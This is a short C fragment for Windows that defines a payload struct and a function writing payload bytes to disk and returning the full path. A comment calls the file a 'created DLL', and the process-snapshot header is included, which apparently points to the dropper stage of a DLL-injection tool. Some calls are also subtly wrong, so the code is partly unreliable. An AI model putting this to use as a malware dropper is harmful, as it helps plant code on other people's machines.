#include <windows.h>
#include <TlHelp32.h>

struct Payload{
    int payloadSize;
    char *payloadData;
} payload;

//create file on disk
char* dropPayloadOnDisk(char *fileName, struct Payload payload){
    HANDLE hFile;
    hFile = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //create file
    if (hFile == INVALID_HANDLE_VALUE){
        return 0;
    }
    if(WriteFile(hFile, payload.payloadData, payload.payloadSize, NULL, NULL)){
        //getting absoluthe path to created DLL
        TCHAR wd[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, wd);
        char *filePath = (char *)malloc(MAX_PATH);
        strcpy(filePath, wd);
        filePath = strcat(filePath, "\\");
        filePath = strcat(filePath, fileName);
        CloseHandle(hFile);
        return filePath;
    }
    CloseHandle(hFile);
    return 0;
}
